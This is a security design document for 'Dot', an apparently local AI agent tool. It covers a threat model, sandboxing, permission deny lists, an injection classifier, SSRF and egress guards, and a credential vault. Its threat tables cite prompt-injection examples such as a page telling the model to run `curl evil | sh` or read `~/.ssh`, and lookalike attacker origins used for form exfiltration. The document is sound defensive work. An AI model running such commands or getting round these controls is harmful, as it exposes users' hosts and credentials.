# Security

## Scope and assumptions

Dot is a single-user tool bound to 127.0.0.1. It does not defend against someone who already controls your account, the Docker daemon or the host. It does defend against a model that misbehaves, and against hostile content that reaches the model (web pages, repositories, MCP servers, search results).

Threats considered:

| Threat | Example |
|---|---|
| Prompt injection | A web page or README tells the model to run `curl evil | sh` or read `~/.ssh`. |
| Model error | A wrong `rm -rf`, an edit to the wrong file. |
| Escape from the workspace | Symlinks, `..`, writes to Dot's own settings and hooks. |
| SSRF | `WebFetch` pointed at cloud metadata or a LAN service. |
| Hostile MCP server | A project config that launches an arbitrary process, or tool descriptions that carry instructions. |
| Local network attacker | Another host or a browser page calling the API. |
| Secret leakage | Token in logs, `.env` read by the model. |

## Layers

| Layer | What it defends | How |
|---|---|---|
| Sandbox container | Host and secrets | Non-root uid 1000, all capabilities dropped, `no-new-privileges`, memory and pid limits, only the workspace mounted. Shell runs with a file-size ulimit and its process group is killed afterwards. The runner process is non-dumpable so shells cannot read its environment. |
| Path jail (sandbox) | Escapes from `/workspace` | Paths are resolved including symlinks; anything outside is refused (403). Writes into `.dot/` are refused. Non-regular files are not read. |
| Protected `.dot` files | Self-modification | `.dot/settings.json` and `.dot/hooks` are bind-mounted read-only into the sandbox, and the workspace is read-only for the backend. |
| Permission rules | Obvious damage and secret reads | Baseline deny list (`deploy/config/dot/default_permissions.json`: SSH keys, `.env`, cloud credentials, `.git` hooks and config). Precedence is deny, then allow, then ask. Invalid settings fail closed. Rules are lexical guardrails; the sandbox is the boundary. |
| Modes | Unattended damage | `plan` is read-only, `default` asks for every edit and command, `acceptEdits` auto-allows file edits only, `auto` uses the classifier, `bypass` asks for nothing (the sandbox boundary still applies). Scheduled runs never use `bypass`. |
| Classifier and taint (auto mode) | Injection driving mutating calls | Stage A is a deterministic shell parser (substitutions, pipes into a shell, writes outside the workspace, destructive patterns). Stage B is taint tracking, with no second model call. Anything unclear becomes an approval card. |
| Hooks | Local policy | PreToolUse hooks can block a call; they run in the sandbox. |
| SSRF guard | Internal network via WebFetch | http(s) only, no credentials in URLs, loopback, private, link-local, CGNAT and metadata ranges refused, DNS resolved once and the connection pinned to the vetted address, every redirect re-checked. Content size and type limits apply. |
| Browser worker (owner view) | Hostile pages | Owner view routes (`/v1/sessions/{id}/browser/*`) go through the same worker, guard and egress proxy; typed text is never audited; owner input is rejected while the agent acts; frames are untrusted images shown in an `<img>` only. |
| Browser worker | Hostile pages | Separate container, read-only root, tmpfs profile, token required, internal link to the backend. Add `deploy/scripts/firewall_dot.sh` to block its access to LAN and metadata ranges (Docker cannot do that alone; the script is never run automatically). Results are tainted. |
| MCP trust | Hostile or changed servers | stdio servers run inside the sandbox with a scrubbed environment. Project-scope servers do not start until you approve their exact config (hash); any change needs a new approval. Every MCP tool asks in all modes except `bypass`, even in auto mode. Tool descriptions are sanitised, sampling and elicitation requests are refused. `${VAR}` expansion reads only names in `DOT_MCP_ENV_ALLOWLIST`. |
| API auth | Other local users or pages | Bearer token (`DOT_API_TOKEN`, minimum 16 characters, the placeholder is rejected at startup), compared in constant time. Tokens are masked in all log lines. The sandbox and browser worker have their own tokens. |
| Limits and headers | Abuse and accidents | Body size (`DOT_MAX_BODY_BYTES`, 1 MiB), message length (`DOT_MAX_MESSAGE_CHARS`), per-client token bucket for chat starts (30 per minute, burst 10), `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, closed CSP, `no-store` on `/v1`. No CORS: browsers reach the API only through the web UI server. |
| Egress guard | Prompt-injection exfiltration | `WebFetch`, `WebSearch` and `BrowserNavigate` ask for approval (any mode but `bypass`) when the URL or query carries a long encoded value, credentials or a very long query string, when a URL was composed by the model after untrusted content entered the chat (links that appear verbatim in earlier tool output or in your own messages pass), or when a search repeats text from untrusted content. The sandbox has no network at all, and shares a network with the backend only. Markdown from the model renders no images, and the web UI CSP allows no remote origin. Details: `docs/privacy.md`. |
| Compose hardening | Container breakout | `cap_drop: ALL`, `no-new-privileges`, memory and pid limits, loopback-only ports, internal networks (`internal: true`, no DNS leak), read-only root for backend, web, voice and browser, no secrets baked into images (they come from `.env` at runtime). |
| Audit log | Accountability | Every evaluated call and every human answer is an append-only row (SQLite triggers reject update and delete). Read it with `GET /v1/audit`. |
| Checkpoints | Recovering from bad edits | Each Write and Edit is checkpointed; `rewind` restores files and messages. |

## What is not covered

- A compromised host, Docker daemon or your own account.
- Reads inside the workspace: the model can read any file you put there. Keep secrets out of it; `.env`-style files are denied by the baseline rules, but that is lexical.
- Host-level egress control: Docker networks block internet routes for the sandbox, llm, web, voice and backend-internal links, but only `deploy/scripts/firewall_dot.sh` (which you apply yourself) stops the egress networks from reaching your LAN and host services.
- Choice-channel exfiltration: a hostile page can list many URLs and the model can pick among them, leaking a few bits per call. The approval policy cannot stop that.
- `bypass` mode: the model can do anything the sandbox can. Use it only on disposable workspaces.
- Remote MCP OAuth is not implemented; use bearer headers from allowlisted env vars.
- The rate limiter is in memory and per remote address; it resets on restart.

## Credential vault

Saved logins and browser sessions that Dot can use in its own browser without ever reading them. Code: `backend/backend/vault/`, `services/browser-worker/src/dot_browser/vault/`.

**Design in one line:** the model names a saved login (`BrowserLogin(credential: <label>, url?)`); the backend sends the secret over the internal token-authed link to the browser worker, which fills the form itself. No tool, API, prompt, transcript, SSE event, log line, audit row, error message or research source ever carries a password, TOTP secret, TOTP code or cookie value. The tool result is only `logged in` or `failed: <coarse reason>` plus the page URL and title (tainted, like all page content).

### Threat model

| Threat | Control |
|---|---|
| Prompt injection asks the model to read or send a secret | There is no read path: the model never receives one. `GET /v1/vault` has no secret fields, there is no reveal endpoint. The owner re-enters a password to change it. |
| Injection steers a login to an attacker page (exfiltration by form) | The worker types only into a page whose origin (scheme + host + port, punycode host, default ports normalised) is exactly in the credential's stored origin list. No wildcards and no suffix matching: `evil-example.com`, `example.com.evil.net`, `example.com@evil.net`, `sub.example.com` (unless listed), `http://` for an https credential and homoglyph or punycode lookalikes all refuse with 4144. The origin is re-checked before every field fill (two-step logins, redirects to an IdP that is not listed refuse). Origins must be https (http only with `DOT_VAULT_ALLOW_HTTP`, tests). |
| Hidden or odd forms | Refused with 4148 and nothing typed: no visible password field, password only inside a frame, form `action` or a submit button `formaction` pointing at another origin. Only visible inputs are ever chosen. |
| Brute force or login spam by a looping model | Every use needs owner approval and is rate limited per credential (default 3 burst, 0.5 per minute, 4145). API calls have their own bucket and size caps (200 credentials, field length caps). |
| Owner approval bypass | `BrowserLogin` is in `ALWAYS_ASK`: allow rules, `bypass`, `auto` and `acceptEdits` never skip the prompt; only a deny rule or plan mode (mutating) can stop it earlier. The card shows site, username and label, never a secret. "Always" means "allow this saved login for this session": it is an in-memory per-session key (`BrowserLogin:<label>`), never written to settings and never covering another login. Subagents do not get the tool. |
| Secrets in logs, telemetry, audit | `register`-style masking (`scoped_secrets`) covers every password, TOTP secret and cookie value while it is in memory; log keys named `password`, `secret`, `cookie`, `vault`, `totp`, `storage_state` are redacted; the worker never logs request bodies, returns only fixed error strings (Playwright text can quote what was typed) and validation errors never echo input. Audit rows (`vault.create|update|delete|use|session_save|session_clear`) hold label, origins and outcome only. |
| Screenshots while typing | The worker sets a `masked` flag for the whole login call: owner frames return 204 meanwhile and the worker takes no screenshots or snapshots itself. Password inputs are rendered as dots anyway. |
| Disk theft (database file, backups, volume) | Passwords, TOTP secrets and session state are AES-256-GCM (`cryptography`; the stdlib has no AEAD) with a random 12-byte nonce per blob and associated data `record id | kind | sorted origins`. A blob cannot be moved to another record or origin list and any bit flip is detected (4147). Usernames, labels, origins and notes are plaintext metadata (do not put secrets in notes). |
| Wrong or lost key | No key (`DOT_VAULT_KEY` unset) or a malformed key turns the vault off with a clear log line and 4140; everything else works. A wrong key fails closed (4147). |

### Browser sessions (cookies)

Saved per credential, sealed with the same key and AAD scheme, written after a successful login, on the owner action "Save this session", and refreshed by a timer (`DOT_VAULT_SESSION_REFRESH_S`, default 300 s) plus at shutdown, so a context reaped after 10 idle minutes (or a restart) does not lose rotated cookies. Only cookies whose Domain covers a bound origin and localStorage of bound origins are kept; everything else (trackers, other sites) is dropped on export, on save and again on restore. Expired cookies are dropped; lifetime is capped at `DOT_VAULT_SESSION_MAX_AGE_DAYS` (30) and session cookies become persistent under that cap. Changing a credential's origins deletes its session. Restore goes through the same origin check:

- Agent: `BrowserLogin` first tries the saved session (restore, open page, look for a login form) and only then types the password; the owner approved that call. After that approval (this Dot session) `BrowserNavigate` to a bound origin re-restores automatically if the browser context was recreated, with no extra prompt per page. Without approval in this Dot session nothing is restored for the agent; `BrowserNavigate` only names the matching saved logins.
- Owner: opening a bound origin in the Browser tab restores silently (the owner is the principal; no prompt).
- The model only ever sees `logged in (saved session restored)` or `failed: the saved session expired ...`.

### Not protected

- Anyone who has both `DOT_VAULT_KEY` and the database (or a backup plus `.env`). The key lives in `.env` next to the data.
- A compromised backend or worker process: secrets are in its memory while a call runs. Python strings cannot be zeroed; references are dropped right after use only.
- The page that legitimately receives the credential (a bound origin that is itself malicious or compromised sees the password, as it would from a human typing).
- Cookie Domain semantics: a `.example.com` cookie is sent by the browser to every subdomain of example.com, not only to the listed origins.
- A live browser context keeps its cookies after "Clear session" until it is closed or reaped (the vault copy is gone at once).
- Short TOCTOU between the origin check and the keystroke inside one bound page.
- Sessions or logins created inside the last refresh interval before a hard crash.

Future work: optional master passphrase (key derived with a KDF and never stored), OS keyring for the key, per-credential approval policy.

## Secrets

`.env` is git-ignored and holds the tokens. Never commit it. Logs, docs and images contain no secret values. Rotate a token by editing `.env` and running `make up` again.
